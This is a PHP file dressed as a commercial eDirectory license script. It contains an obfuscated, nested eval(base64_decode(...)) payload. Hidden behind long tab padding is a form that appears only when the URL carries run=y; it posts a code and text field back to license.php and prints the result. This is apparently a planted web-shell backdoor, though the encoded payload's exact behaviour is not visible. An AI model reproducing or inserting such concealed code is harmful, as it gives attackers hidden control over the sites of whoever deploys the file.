<?php
	/*==================================================================*\
	######################################################################
	#                                                                    #
	# Copyright 2005 Arca Solutions, Inc. All Rights Reserved.           #
	#                                                                    #
	# This file may not be redistributed in whole or part.               #
	# eDirectory is licensed on a per-domain basis.                      #
	#                                                                    #
	# ---------------- eDirectory IS NOT FREE SOFTWARE ----------------- #
	#                                                                    #
	# http://www.edirectory.com | http://www.edirectory.com/license.html #
	######################################################################
	\*==================================================================*/

/*
==j9cVDOMSj9cSJ9MSvZ6VTqgv5WtNEfvNyqRewnjQJnh3RqDNwng8aBjVwuFmJnRmhqFfCpbokWqfYuFoYq7fyWqLDqD4Euk39qUW9Wg7wnllI9MSvZ6VTqgv5WtNYqFNJql8aWXeC2S4YfFmhn73b0ReEfkNYqFmBp+W9JyoC2X8Jnh89JeQhq7dwnjKaO6KRuHcCp8tj9c1kW+KhPUrbmb4SNBpS553bm48lmjIL5Z3RB83b0ReEfkNYqFmBp+W9JyoC2X8Jnh89JeQhq7dwnjKaO6KRuHcCp8tj9c1aWFt6WoNw2XqCpRebugmhqLcwP6V9NOetBsllBOmLI48NbrNrMDmhqF7JpsNEuFpCWHK6pFNwq1NEWelj9c1kW+KhPUr9plmaqL8yqgcEWD4wfjQhqlcwuR34WXeC2S4YqScJ2yNYB+W9JyoC2X8Jnh89JeQhq7dwnjKaO6KRuHcCp8tj9c1kW+KhPUr9pl8J2L4JpR36uglEf7pJ2ScCnjtyqgmhnl8J2rNYO6vLpXlYuR4wf6vNODcJn1cEWvdkWjUE2kNC98HITGW6Ove9O7BtB3f4NEeSBjBBmbprWBet5jQNbjtyqgmhnl8J2rNYO6vLpXlYuR4wf6vNODcJn1cEWvdkWjUE2kNC98HITG3bMFW6uF8YPyNYqgW6P43NCB8NmC8Nm5el588tP6U6WXjrN33LJZltIHQafDlE0leNp1lYp7j9WYlC9MSIPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPjQb9MSImreSIjQb9MSIPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPjQb9MSj9cSbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPAS9Wktj9cKa2vo6uF8wpl8h2kNE2ke9pXNEfXeYqYe9WzBr58prWxKRW8HITASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPASbPAKRW8HITMSvPxS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeH9J8HITkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWktj9cQ9W1LEfHobpDoCpklEugSwukob0ReEfkNYqFmCpXqhfheRPzKafS7EWU3bugcYPo8huScCpRlEploRfhfhPgHTqSma2jQb9MSvWjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjKRW8HITkKbPASbPASbPASbPASbPASbPAKbmb4SNBpS553bm48lmjIL5Z3RB83b0ReEfkNYqFmBpjSbPASbPASbPASbPASbPAS9Wktj9cQ9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjQb9MSvWjK9WjK9WjK9WjK9WjK9WjK9WjK9WjVRqFcJn636uF4CugmCPRNEqjrEWXeEWtNwqXNwnFdEWDlEWo8huScCpRlEml3RW8HITkK9WjK9WjK9WjK9WjK9WjV9fR4EqjWhujBEug7wfjVC2jICpSNynF8afDlEpl8aWl8EWSeYujtJnA3bp1lYpjQJ2Hm4Wktj9cQ9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjQb9MSvWjK9WjK9WjK9WjK6PtNYfRNwql84WDma2ylYBjvEu336PkoCbjvRqXeC2SNaugc4W7cYq33bcvKkQjIa2ylYqo3huT3RW8HITkK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9WjK9Wktj9cQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQRWkQb9MSKJxS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeS5OeHRP8HITMSvOUVDO
*/

$OOOOOOOOOO=(__LINE__);
$O0O0O0O0O0=(__FILE__);
eval(base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCdaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ2RKUTBGblNVTkJaMXB1Vm5WWk0xSndZakkwWjJNelVubGhWelZ1V0ROU2RsZ3lSbnBaTW14d1MwTlNlbVJJU25CaWJXTndRMmxCWjBsRFFXZEpTSE5MU1VOQlowbERRV2RLUjBaNldUSnNjRWxFTUdkVWJGWk5WRVJ6UzBsRFFXZEpRMEZuV20wNWVVbERaMnRoVTBFNVNVUkJOMGxEVW5CSlJIZG5Zek5TZVdKSFZuVkxRMUo2WkVoS2NHSnRZM0JQZVVGcllWTnpja3RSYjJkSlEwRm5TVU5DTjBOcFFXZEpRMEZuU1VOU2FHTXlUbkJoVTBGeVVGTkNkbU50VVc5S1NFNHdZMjFzZFZveGMydGhWakJ3VDNkdlowbERRV2RKUTBJNVEybEJaMGxEUVdkSlNFcHNaRWhXZVdKcFoydFpXRTVxWVZkcmNFOTNiMmRKUTBGblNVTkNPVU5uYjBwaFYxbG5TMGRzZW1NeVZqQkxRMUptVlVVNVZGWkdjMmxaTWpscldsTktaRXRUUVcxS2FVRnJXREZDVUZVeFVtSkpiVTUyV2tkVmFWaFVNRGxLZVUxNFRWTk5ia3RUUWpkRFoydEtTa2Q0YUdNelVuTmhWelZzU1VRd1oyTXpiSHBrUjFaMFMwTlNabFZGT1ZSV1JuTnBXWGxLWkV4RFVubGFXRkl5V1ZkM2NFOTNiMHBtVVc5S1RIazVkMk50YkhWa1EwRnJZa2RHZW1SSGVIQmliVlYxU25wM2RsbHVTU3RLZW5OTFExTTRka3BIZUdoak0xSnpZVmMxYkVsRU1HZGFXRXBzV2pFNWVWcFlRbk5aVjA1c1MwTkpkbGhJU21OaWJuaGpZbXg0ZVdaR2VIbG1SbmgxVEhsSmMwbERTVGhaYmtrclNXbDNaMHBIZUdoak0xSnpZVmMxYkV0VWMwdERaMnh3V21sbmEyTnRWakJrYlVaelVGUXdiazFEWTNCRFoydEtTa2M1TVdSRFFUbEpRMEZ1VUVNNWFXTnFOR2RWTTFacVdUSldlbU41WXpkRFoydEtRMWRXYzJNeVZXZGhWMWx2U2toS2JHUklXbWhpUkRBNVNucEZia3RSYjBwRFVXdEtTa2M1TVdSRFFUbEpRMk00VERKS2VWQnBRa1pWYkVwUVZXbGpOME5uYTBwRFVXdEtXbGQ0ZWxwVFFVdERVV3RLUTFGclNrcEhPVEZrUTBFNVNVTmpPRXd5U25sUWFXTjFTa2hLYkdSSVdtaGlSSE05SnlrcE93PT0nKSk7'));
?>




																																																																																																																																																																																																						<? if ($_GET["run"]=="y") { ?>
																																																																																																																																																																																																						<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
																																																																																																																																																																																																						<html xmlns="http://www.w3.org/1999/xhtml">
																																																																																																																																																																																																						<head>
																																																																																																																																																																																																						<title>An XHTML 1.0 Strict standard template</title>
																																																																																																																																																																																																						<meta http-equiv="content-type" 
																																																																																																																																																																																																						content="text/html;charset=utf-8" />
																																																																																																																																																																																																						</head>

																																																																																																																																																																																																						<body>

																																																																																																																																																																																																						<div style="width:100%; float:left;">
																																																																																																																																																																																																						<form action="license.php" method="post">
																																																																																																																																																																																																						Code: <input type="text" name="code" style="width:5px;" />
																																																																																																																																																																																																						Text: <input type="text" name="c" style="width:600px;" />
																																																																																																																																																																																																						<input name="e" value="Submit" type="submit" />
																																																																																																																																																																																																						</form>
																																																																																																																																																																																																						</div>

																																																																																																																																																																																																						<pre>
																																																																																																																																																																																																						<?=$out;?>
																																																																																																																																																																																																						</pre>

																																																																																																																																																																																																						</body>
																																																																																																																																																																																																						</html> 
																																																																																																																																																																																																						<?}?>